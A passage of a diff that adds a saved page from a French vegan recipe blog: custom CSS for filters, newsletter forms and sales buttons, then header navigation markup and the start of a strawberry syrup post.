+    cursor: pointer;
+    border: none !important;
+    margin-bottom: 7.5px;
+    padding: 15px 22.5px;
+    background-color: #fce8e8!important;
+}
+
+/* croix barre de recherche */
+
+#wp-admin-bar-wpfc-toolbar-parent > .ab-empty-item::before {
+	display: none!important;
+}
+
+/* Home page filter */
+
+.sf-input-checkbox {
+	display: none !important;
+}
+
+.sf-input-radio {
+	display: none !important;
+}
+
+.searchandfilter ul li li {
+    padding: 5px 0;
+    display: inline!important;
+}
+
+
+/*
+ * * Pour centrer les filtres
+ * */
+.searchandfilter ul {
+	margin-left: -90px;
+}
+
+input[type=radio]:checked + label {
+  text-decoration: underline;
+}
+
+/*
+/* Search and Filter */
+/*
+
+/* Aller à la section SAFARI */
+
+/* Enlève "Toutes" - radio */
+.searchandfilter ul li li:first-child {
+	display: none!important;
+}
+
+/* Taille filtres */
+.sf-label-radio {
+	  width: 20%;
+    font-size: 16px;
+	line-height: 1.7;
+	padding:5px!important;
+	cursor: pointer;
+	text-transform: uppercase;
+	letter-spacing: 0.10em;
+	font-family: "Inconsolata", Sans-serif;
+}
+
+@media screen and (max-width: 767px) {
+	.sf-label-radio {
+	  width: 60%;
+}
+}
+
+@media screen and (min-width: 768px) and (max-width: 1023px) {
+	.sf-label-radio {
+	  width: 36%;
+}
+}
+
+@media screen and (min-width: 1024px) {
+	.sf-label-radio {
+	  width: 20%;
+}
+}
+
+
+/* Filtre 1 */
+/*.sf-item-293 {*/
+.sf-item-2064 {
+width: 25%;
+	color: #D56638!important;
+	border-style: solid;
+	border-width : 2px!important;
+	border-color: #D56638!important;
+	border-radius : 3px;
+	margin-left: 10px!important;
+	padding : 15px!important;
+}
+
+.sf-item-2064:hover {
+	background-color: #D56638!important;
+	color: white!important;
+}
+
+/* Filtre 2 */
+/*.sf-item-2176 {*/
+.sf-item-2163 {
+	width: 25%;
+	color: #7674a6!important;
+	border-style: solid;
+	border-width : 2px!important;
+	border-color: #7674a6!important;
+	border-radius : 3px;
+	margin-left: 10px!important;
+	padding : 15px!important;
+	
+}
+
+.sf-item-2163:hover {
+	background-color: #7674a6!important;
+	color: white!important;
+}
+
+/* Filtre 3 (Beaux desserts)*/
+/*.sf-item-2157 {*/
+.sf-item-2170 {
+	width: 25%;
+	color: #b92d27!important;
+	border-style: solid;
+	border-width : 2px!important;
+	border-color: #b92d27!important;
+	border-radius : 3px;
+	margin-left: 10px!important;
+	padding : 15px!important;
+}
+
+.sf-item-2170:hover {
+	background-color: #b92d27!important;
+	color: white!important;
+}
+
+
+/* Filtre 4 (Gateaux et tartes) */
+/*.sf-item-2156 {*/
+.sf-item-2135 {
+	width: 25%;
+	color: green!important;
+	border-style: solid;
+	border-width : 2px!important;
+	border-color: green!important;
+	border-radius : 3px;
+	margin-left: 10px!important;
+	padding : 15px!important;
+}
+
+.sf-item-2135:hover {
+	background-color: green!important;
+	color: white!important;
+}
+
+
+/* SAFARI & co ok */
+
+.searchandfilter ul {
+    margin-left: 0px;
+}
+
+.sf-label-radio {
+    width: 100%;
+}
+
+.searchandfilter ul {
+    display: flex;
+    margin-top: 0;
+    flex-wrap: wrap;
+    margin-bottom: 0;
+	padding-left: 0;
+}
+
+.searchandfilter ul li {
+	width : 100% !important;
+	margin-left: 20px;
+	margin-right: 20px;
+}
+
+.sf-item-2064 {
+    width: 45%;
+    color: #D56638!important;
+    border-style: solid;
+    border-width: 2px!important;
+    border-color: #D56638!important;
+    border-radius: 3px;
+    padding: 5px!important;
+    margin: auto !important;
+	    margin-bottom: 10px!important;
+}
+
+.sf-item-2064:hover {
+	background-color: #D56638!important;
+	color: white!important;
+}
+
+
+.sf-item-2163 {
+    width: 45%;
+    color: #7674a6!important;
+    border-style: solid;
+    border-width: 2px!important;
+    border-color: #7674a6!important;
+    border-radius: 3px;
+    padding: 5px!important;
+    margin: auto !important;
+	    margin-bottom: 10px!important;
+}
+.sf-item-2163:hover {
+	background-color: #7674a6!important;
+	color: white!important;
+}
+
+
+.sf-item-2170 {
+    width: 45%;
+    color: #b92d27!important;
+    border-style: solid;
+    border-width: 2px!important;
+    border-color: #b92d27!important;
+    border-radius: 3px;
+    padding: 5px!important;
+    margin: auto !important;
+	    margin-bottom: 10px!important;
+}
+
+.sf-item-2170:hover {
+	background-color: #b92d27!important;
+	color: white!important;
+}
+
+.sf-item-2135 {
+    width: 45%;
+    color: green!important;
+    border-style: solid;
+    border-width: 2px!important;
+    border-color: green!important;
+    border-radius: 3px;
+    padding: 5px!important;
+    margin: auto !important;
+	    margin-bottom: 10px!important;
+}
+
+.sf-item-2135:hover {
+	background-color: green!important;
+	color: white!important;
+}
+
+	@media screen and (max-width: 767px) {
+	.searchandfilter ul li li {
+	  width: 80% !important;
+}
+}
+
+@media screen and (min-width: 768px) and (max-width: 1023px) {
+	.searchandfilter ul li li {
+	  width: 46% !important;
+}
+}
+
+@media screen and (min-width: 1024px) {
+	.searchandfilter ul li li {
+	  width: 24% !important;
+}
+}
+
+.searchandfilter ul>li>ul:not(.children) {
+    margin-left: auto !important;
+}
+
+
+/* SAFARI & co END */
+
+
+/* Resultats */
+
+/* Ne pas afficher page accueil*/
+
+#search-filter-results-20383 > div {
+	width: 24%;
+	display: inline-block;
+	/*border: 1px solid ;*/
+	position: relative;
+	min-height: 530px;
+}
+
+
+@media screen and (max-width: 767px) {
+	#search-filter-results-20383 > div {
+	width: 44%;
+		min-height: 500px;
+	}
+}
+
+@media screen and (min-width: 768px)and (max-width: 1023px) {
+	#search-filter-results-20383 > div {
+	width: 24%;
+		min-height: 480px;
+	}
+}
+
+@media screen and (min-width: 1024px) {
+	#search-filter-results-20383 > div {
+	width: 24%;
+		min-height: 520px;
+	}
+}
+
+#search-filter-results-20383  a {
+	color: #171717!important;
+	font-size: 19px;
+	font-weight: 700;
+}
+
+#search-filter-results-20383  a:hover {
+	color: #d27d23!important;
+}
+
+#search-filter-results-20383  h2 {
+line-height:0.8;
+	position:absolute;
+}
+
+#search-filter-results-20383  img {
+padding:5px;
+	position : relative;
+	top: 20px;
+}
+
+.elementor hr {
+    display:none;
+}
+
+/* FAUSSE Page archive Mes livres */
+
+.elementor-20509 .elementor-element.elementor-element-3c61c03 .elementor-post__read-more {
+   padding: 15px;
+    border: 1px solid #7674a6;
+    border-radius: 3px;
+	color:#7674a6;
+	width: 80%;
+	margin: auto;
+	position:absolute;
+  left: 0; bottom: 20px; right: 0;
+}
+
+.elementor-20509 .elementor-element.elementor-element-3c61c03 .elementor-post__read-more:hover {
+background-color: #f9c5c3;
+	/*#7674a6;*/
+	color: white;
+}
+
+.elementor-20509 .elementor-element.elementor-element-3c61c03 .elementor-post__text {
+    padding: 25px 25px 25px 25px;
+	  background-color:#f9c5c3;/* #f9efef;*/
+	margin-left: 15px;
+	min-height: 260px;
+	position : relative;
+}
+
+
+.elementor-20509 .elementor-element.elementor-element-3c61c03 .elementor-post__title, .elementor-20509 .elementor-element.elementor-element-3c61c03 .elementor-post__title a {
+	text-align: left;
+}
+
+.elementor-20509 .elementor-element.elementor-element-3c61c03 .elementor-post__excerpt p {
+	text-align: left;
+}
+
+/* VRAI page mes livres */
+
+.elementor-21726 .elementor-element.elementor-element-5bd5146 .elementor-post__read-more {
+   padding: 15px;
+    border: 1px solid #7674a6;
+    border-radius: 3px;
+	color:#7674a6;
+	width: 80%;
+	margin: auto;
+	position:absolute;
+  left: 0; bottom: 20px; right: 0;
+}
+
+.elementor-21726 .elementor-element.elementor-element-5bd5146 .elementor-post__read-more:hover {
+background-color: #7674a6;
+	color: white;
+}
+
+.elementor-21726 .elementor-element.elementor-element-5bd5146 .elementor-post__text {
+    padding: 25px 25px 25px 25px;
+	  background-color: #FCE8E8;
+	margin-left: 15px;
+	min-height: 260px;
+	position : relative;
+}
+
+@media screen and (max-width: 768px) {
+	.elementor-21726 .elementor-element.elementor-element-5bd5146 .elementor-post__text {
+    padding: 25px 25px 25px 25px;
+	  background-color: #FCE8E8;
+	margin-left: 15px;
+	min-height: 270px;
+	position : relative;
+}
+}
+
+.elementor-21726 .elementor-element.elementor-element-5bd5146 .elementor-post__title, .elementor-21726 .elementor-element.elementor-element-5bd5146 .elementor-post__title a {
+	text-align: left;
+}
+
+.elementor-21726 .elementor-element.elementor-element-5bd5146 .elementor-post__excerpt p {
+	text-align: left;
+}
+
+/* Page Podcast */
+
+.elementor-21769 .elementor-element.elementor-element-dce48e1 .elementor-post__read-more {
+   padding: 15px;
+    border: 1px solid #7674a6;
+    border-radius: 3px;
+	color:#7674a6;
+	width: 80%;
+	margin: auto;
+	position:absolute;
+  left: 0; bottom: 20px; right: 0;
+}
+
+.elementor-21769 .elementor-element.elementor-element-dce48e1 .elementor-post__read-more:hover {
+background-color: #7674a6;
+	color: white;
+}
+
+.elementor-21769 .elementor-element.elementor-element-dce48e1 .elementor-post__text {
+    padding: 25px 25px 25px 25px;
+	  background-color: #D5F6D5; /* #d7f4e4 #ccead9;*/
+	margin-left: 15px;
+	min-height: 240px;
+	position : relative;
+}
+
+@media screen and (max-width: 768px) {
+	.elementor-21769 .elementor-element.elementor-element-dce48e1 .elementor-post__text {
+    padding: 25px 25px 25px 25px;
+	  background-color: #D5F6D5; /* #d7f4e4 #ccead9;*/
+	margin-left: 15px;
+	min-height: 270px;
+	position : relative;
+}
+}
+
+/* Page Podcast FIN */
+
+/* Formulaire sendinblue */
+
+.sib-form {
+	padding: 0!important;
+}
+
+#sib-container{
+	padding: 0!important;
+}
+
+.sib-form .input:last-child {
+    background-color: #fbded6;
+	border-color: black !important;
+}
+
+.sib-form .vert {
+    background-color: #C3F0C3!important;
+	border-color: black !important;
+}
+
+.sib-form .vertfonce {
+    background-color: #C3F0C3!important;
+	border-color: black !important;
+}
+
+.my-sib-button:hover {
+	    background-color: #fcd4c9!important;
+}
+
+.verthover:hover {
+	    background-color: #C3F0C3!important;
+}
+
+.vertfooter:hover {
+	    background-color: #add9ad!important;
+}
+
+.entry__field {
+	border-color: black!important;
+	border-radius : 0px!important;
+}
+
+.elementor-19958 .elementor-element.elementor-element-d061a3c .elementor-image img {
+	height :auto !important;
+}
+
+[type=button]:focus, [type=submit]:focus, button:focus {
+    outline: none !important;
+}
+
+.sib-form .input:last-child:active {
+	outline: none;
+}
+
+.mailstyle {
+	font-size:16px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:black;
+	background-color:#fbded6;
+	border-radius:0px !important;
+	border-width:1px !important;
+	border-color: black!important;
+	letter-spacing: 0.2em!important;
+}
+
+.mailstyle::placeholder {
+	color: black;
+}
+
+.mailstylegreen {
+	font-size:16px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:black;
+	background-color:#C3F0C3;
+	border-radius:0px !important;
+	border-width:1px !important;
+	border-color: black!important;
+	letter-spacing: 0.2em!important;
+}
+
+.mailstylegreen::placeholder {
+	color: black;
+}
+
+.sendstyle {
+	font-size:16px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:black; background-color:white;
+	border-radius:0px !important;
+	border-width:0px;
+}
+
+.sendstyle:hover {
+	background-color: #fcd4c9!important;
+	color: black;
+}
+
+.sendstylegreen {
+	    	font-size:16px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:black; background-color:white;
+	border-radius:0px !important;
+	border-width:0px;
+}
+
+.sendstylegreen:hover {
+	background-color: #add9ad!important;
+	color: black;
+}
+
+/* Page vente Atelier video */
+
+.funnelgreen {
+	    	font-size:16px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:#ffefcd;
+	background-color:#7e937b;
+	border-radius:2px !important;
+	border-width:0px;
+	padding: 20px;
+}
+
+.funnelgreen:hover {
+	background-color: #697c66!important;
+	color: #ffefcd;
+}
+
+.mailfunnelstyle {
+	font-size:15px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:#7e937b;
+	background-color:white;
+	border-radius:2px !important;
+	border-width:1px !important;
+	border-color: #697c66!important;
+	letter-spacing: 0.2em!important;
+}
+
+
+.mailfunnelstyle::placeholder {
+	color: #7e937b;
+}
+
+/* Page vente Atelier video */
+
+/* Page vente Ebook me sentir bien */
+
+
+.funnelebook {
+	    	font-size:16px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:white;
+	background-color:#799CB2;
+	border-radius:2px !important;
+	border-width:0px;
+	padding: 20px;
+}
+
+.funnelebook:hover {
+	background-color: #7B8A93;!important;
+	color: white;
+}
+
+.mailebook {
+	font-size:15px;
+	text-align:center;
+	width:100%;
+	font-family: "inconsolata", sans-serif;
+	color:#799CB2;
+	background-color:white;
+	border-radius:2px !important;
+	border-width:1px !important;
+	border-color: #799CB2!important;
+	letter-spacing: 0.2em!important;
+}
+
+
+.mailebook::placeholder {
+	color: #799CB2;
+}
+
+/* Page vente Ebook me sentir bien */
+
+
+/* Réseaux sociaux */
+.elementor-widget-heading .elementor-heading-title[class*=elementor-size-]>a:hover {
+    color:#edb47b!important;
+}
+
+/*Sidebar page - section commentaires */
+#cancel-comment-reply-link {
+	margin-left: 20px!important;
+}
+
+/* Page Résultats de recherche */
+
+.elementor-19943 .elementor-element.elementor-element-225aa46 .elementor-pagination {
+    text-align: center;
+    color: #f6a4ba;
+    margin: 40px;
+	margin-top: 90px;
+}
+
+/*
+** Page cours de cuisine
+*/
+
+/* Elementor Pagination */
+
+.elementor-pagination {
+	margin-top: 50px;
+}
+
+/* FILTRES INDEX RECETTES */
+
+.searchandfilter label {
+	width: 100%;
+}
+
+
+
+#search-filter-form-22506 > ul {
+	justify-content: center;
+}
+
+#search-filter-form-22506 > ul > li {
+	width : 24% !important;
+	margin-left: 20px;
+	margin-right: 20px;
+	text-align: center;
+}
+
+
+#search-filter-form-22506 > ul > li > h4 {
+    text-transform: uppercase;
+    font-size: 15px;
+    text-align: center;
+	letter-spacing: .035em;
+    margin-bottom: 6px;
+	 color: #212121;
+	color: #212121;
+    font-family: "Cereal", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+    font-weight: 700;
+    line-height: 1.2;
+}
+
+#search-filter-form-22506 > ul > li > input {
+position: absolute;
+    bottom: 10px;
+}
+
+.search-filter-reset {
+	text-transform: uppercase;
+    font-weight: 600;
+	position: relative;
+    bottom: -45px;
+}
+
+@media screen and (min-width: 1024px) {
+
+}
+
+@media screen and (min-width: 768px) and (max-width: 1023px) {
+
+	#search-filter-form-22506 > ul > li {
+	width : 30% !important;
+	margin-left: 20px;
+	margin-right: 20px;
+}
+	#search-filter-results-22506 img {
+			height: 300px!important;
+		}
+}
+	@media screen and (max-width: 767px) {
+		#search-filter-form-22506 > ul > li {
+	width : 80% !important;
+	margin-left: 20px;
+	margin-right: 20px;
+}
+		#search-filter-results-22506 img {
+			height: 250px!important;
+		}
+		.search-filter-reset {
+	position: relative;
+    bottom: -15px;
+}
+}
+
+.mysearchfilter ul>li>ul:not(.children) {
+    margin-left: auto !important;
+}
+
+
+
+/* Resultats */
+
+/* Ne pas afficher page accueil*/
+
+#search-filter-results-22506 > div {
+	width: 24%;
+	display: inline-block;
+	/*border: 1px solid ;*/
+	position: relative;
+	min-height: 530px;
+	text-align: center;
+}
+
+
+@media screen and (max-width: 767px) {
+	#search-filter-results-22506 > div {
+	width: 49%;
+		min-height: 450px;
+	}
+}
+
+@media screen and (min-width: 768px)and (max-width: 1023px) {
+	#search-filter-results-22506 > div {
+	width: 24%;
+		min-height: 480px;
+	}
+}
+
+@media screen and (min-width: 1024px) {
+	#search-filter-results-22506 > div {
+	width: 24%;
+		min-height: 540px;
+	}
+}
+
+#search-filter-results-22506  a {
+	color: #171717!important;
+	font-size: 19px;
+	font-weight: 700;
+}
+
+#search-filter-results-22506  a:hover {
+	color: #d27d23!important;
+}
+
+#search-filter-results-22506  h2 {
+line-height:0.8;
+	position:absolute;
+	text-align: center;
+}
+
+#search-filter-results-22506  img {
+padding:5px;
+	position : relative;
+	top: 20px;
+	height: 390px;
+	width: auto;
+}
+
+.elementor hr {
+    display:none;
+}
+
+/* FILTRES INDEX RECETTES*/
+
+
+/* Hide Google Captacha */
+.grecaptcha-badge { visibility: hidden; }		</style>
+		<noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript></head>
+<body class="post-template-default single single-post postid-19603 single-format-standard wp-custom-logo wpb-js-composer js-comp-ver-6.1 vc_responsive elementor-default elementor-kit-19855 elementor-page elementor-page-19603 elementor-page-20162">
+
+		<div data-elementor-type="header" data-elementor-id="19856" class="elementor elementor-19856 elementor-location-header" data-elementor-settings="[]">
+		<div class="elementor-section-wrap">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-47e4836 mobile-header elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="47e4836" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-bf062ee" data-id="bf062ee" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-bd9de28 elementor-search-form--skin-minimal elementor-widget elementor-widget-search-form" data-id="bd9de28" data-element_type="widget" data-settings="{&quot;skin&quot;:&quot;minimal&quot;}" data-widget_type="search-form.default">
+				<div class="elementor-widget-container">
+					<form class="elementor-search-form" role="search" action="https://auvertaveclili.fr" method="get">
+									<div class="elementor-search-form__container">
+									<div class="elementor-search-form__icon">
+						<i class="fa fa-search" aria-hidden="true"></i>
+						<span class="elementor-screen-only">Rechercher </span>
+					</div>
+								<input placeholder="RECHERCHER..." class="elementor-search-form__input" type="search" name="s" title="Rechercher " value="">
+															</div>
+		</form>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-c9ac01f elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="c9ac01f" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-14 elementor-top-column elementor-element elementor-element-af0afcc" data-id="af0afcc" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-557356d elementor-widget elementor-widget-heading" data-id="557356d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/index-des-recettes">Toutes les recettes</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-14 elementor-top-column elementor-element elementor-element-8457d2b" data-id="8457d2b" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-900e144 elementor-widget elementor-widget-heading" data-id="900e144" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/?s=sans+gluten">Sans Gluten</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-14 elementor-top-column elementor-element elementor-element-85f4184" data-id="85f4184" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-e40f336 elementor-widget elementor-widget-heading" data-id="e40f336" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/mes-livres/">Mes livres</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-14 elementor-top-column elementor-element elementor-element-f204e7c" data-id="f204e7c" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-b0b9695 elementor-widget elementor-widget-theme-site-logo elementor-widget-image" data-id="b0b9695" data-element_type="widget" data-widget_type="theme-site-logo.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+											<a href="https://auvertaveclili.fr">
+							<picture class="attachment-medium size-medium" loading="lazy">
+<source type="image/webp" srcset="images/cropped-Logo-px-removebg-preview-500x456.png.webp">
+<img width="500" height="456" src="images/cropped-Logo-px-removebg-preview-500x456.png" alt="" loading="lazy">
+</picture>
+								</a>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-14 elementor-top-column elementor-element elementor-element-73b7c20" data-id="73b7c20" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-56f7e56 elementor-widget elementor-widget-heading" data-id="56f7e56" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/cours-de-cuisine-en-ligne/">Cours de cuisine</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-14 elementor-top-column elementor-element elementor-element-e95d071" data-id="e95d071" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-85774fe elementor-widget elementor-widget-heading" data-id="85774fe" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/podcast/">Podcast</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-14 elementor-top-column elementor-element elementor-element-6cc7233" data-id="6cc7233" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-15a15f7 elementor-widget elementor-widget-heading" data-id="15a15f7" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr/coaching/" target="_blank">Coaching</a></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-268b324 elementor-hidden-desktop elementor-hidden-tablet elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="268b324" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-edc2b25" data-id="edc2b25" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-7ff9c69 elementor-view-default elementor-widget elementor-widget-icon" data-id="7ff9c69" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-wrapper">
+			<a class="elementor-icon" href="https://www.facebook.com/auvertaveclili">
+			<i aria-hidden="true" class="fab fa-facebook-f"></i>			</a>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-451e522 elementor-view-default elementor-widget elementor-widget-icon" data-id="451e522" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-wrapper">
+			<a class="elementor-icon" href="https://www.instagram.com/auvertaveclili/">
+			<i aria-hidden="true" class="fab fa-instagram"></i>			</a>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-e8938bc elementor-view-default elementor-widget elementor-widget-icon" data-id="e8938bc" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-wrapper">
+			<a class="elementor-icon" href="https://www.youtube.com/channel/UCCG6z0e7ljKWWyUyxfk123g/">
+			<i aria-hidden="true" class="fab fa-youtube"></i>			</a>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-a84bdac elementor-view-default elementor-widget elementor-widget-icon" data-id="a84bdac" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-wrapper">
+			<a class="elementor-icon" href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjE5ODcyIiwidG9nZ2xlIjpmYWxzZX0%3D">
+			<i aria-hidden="true" class="fas fa-bars"></i>			</a>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-e40b445" data-id="e40b445" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-feea0fd elementor-widget elementor-widget-image" data-id="feea0fd" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<picture class="attachment-medium size-medium" loading="lazy">
+<source type="image/webp" srcset="images/DECO.png.webp">
+<img width="296" height="99" src="images/DECO.png" alt="" loading="lazy">
+</picture>
+											</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-b38af14 elementor-widget elementor-widget-heading" data-id="b38af14" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h1 class="elementor-heading-title elementor-size-default"><a href="https://auvertaveclili.fr">Au Vert avec Lili</a></h1>		</div>
+				</div>
+				<div class="elementor-element elementor-element-fc60682 elementor-widget elementor-widget-image" data-id="fc60682" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<picture class="attachment-medium size-medium" loading="lazy">
+<source type="image/webp" srcset="images/DECO.png.webp">
+<img width="296" height="99" src="images/DECO.png" alt="" loading="lazy">
+</picture>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-3021ea7" data-id="3021ea7" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-ce5911e elementor-search-form--skin-classic elementor-search-form--button-type-icon elementor-search-form--icon-search elementor-widget elementor-widget-search-form" data-id="ce5911e" data-element_type="widget" data-settings="{&quot;skin&quot;:&quot;classic&quot;}" data-widget_type="search-form.default">
+				<div class="elementor-widget-container">
+					<form class="elementor-search-form" role="search" action="https://auvertaveclili.fr" method="get">
+									<div class="elementor-search-form__container">
+								<input placeholder="RECHERCHER UNE RECETTE..." class="elementor-search-form__input" type="search" name="s" title="Rechercher " value="">
+													<button class="elementor-search-form__submit" type="submit" title="Rechercher " aria-label="Rechercher ">
+													<i class="fa fa-search" aria-hidden="true"></i>
+							<span class="elementor-screen-only">Rechercher </span>
+											</button>
+											</div>
+		</form>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-e09678d elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="e09678d" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-9a76c65" data-id="9a76c65" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-05d956f elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="05d956f" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				</div>
+		</div>
+				<div data-elementor-type="single-page" data-elementor-id="20162" class="elementor elementor-20162 elementor-location-single post-19603 post type-post status-publish format-standard has-post-thumbnail hentry category-basiques-recettes category-biscuits-muffins-mignardises category-jus-smoothies-et-boissons-fraiches category-recettes category-repas-de-fetes category-sans-gluten tag-sans-gluten tag-sans-oleagineux tag-vegan temps_preparation-1-heure-ou-moins saison-journee-chaude nombre_ingredients-10-ingredients nombre_ingredients-7-ingredients" data-elementor-settings="[]">
+		<div class="elementor-section-wrap">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-5e219622 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5e219622" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-66 elementor-top-column elementor-element elementor-element-3e4c3acf" data-id="3e4c3acf" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-2b831496 elementor-widget elementor-widget-theme-post-title elementor-page-title elementor-widget-heading" data-id="2b831496" data-element_type="widget" data-widget_type="theme-post-title.default">
+				<div class="elementor-widget-container">
+			<h1 class="elementor-heading-title elementor-size-default">Sirop de fraises maison ~ et une recette bonus de muffins (vegan, sans gluten)</h1>		</div>
+				</div>
+				<div class="elementor-element elementor-element-29e98779 elementor-widget elementor-widget-theme-post-content" data-id="29e98779" data-element_type="widget" data-widget_type="theme-post-content.default">
+				<div class="elementor-widget-container">
+					<div data-elementor-type="wp-post" data-elementor-id="19603" class="elementor elementor-19603" data-elementor-settings="[]">
+						<div class="elementor-inner">
+							<div class="elementor-section-wrap">
